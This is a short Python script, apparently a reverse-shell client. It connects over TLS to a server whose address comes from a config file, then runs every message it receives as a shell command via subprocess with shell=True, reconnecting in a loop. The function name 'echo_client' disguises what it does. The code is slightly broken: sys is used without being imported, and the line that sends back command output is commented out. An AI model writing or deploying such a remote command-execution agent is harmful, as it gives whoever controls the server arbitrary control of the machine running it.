import socket
import ssl
import subprocess
import json


def get_json_data(json_file):
    return json.load(open(json_file))


def echo_client(s):
    while True:
        data = s.recv(8192)
        print(data.decode("utf-8"))
        response = subprocess.check_output(data, shell=True)
        # encoded = encode(response)
        # s.send(encoded)
        print(response)
        if data == b'':
            break
        s.send(b'This is a response.')
        print('Connection closed')
    s.close()


def main():
    config_data = get_json_data('config_w.json')

    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Require a certificate from the server. We used a self-signed certificate
        # so here ca_certs must be the server certificate itself.
        ssl_sock = ssl.wrap_socket(s,cert_reqs=ssl.CERT_REQUIRED, ca_certs='cert')
        ssl_sock.connect((config_data['ip'], config_data['port']))
        echo_client(ssl_sock)
        ssl_sock.close()


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
            sys.exit(2)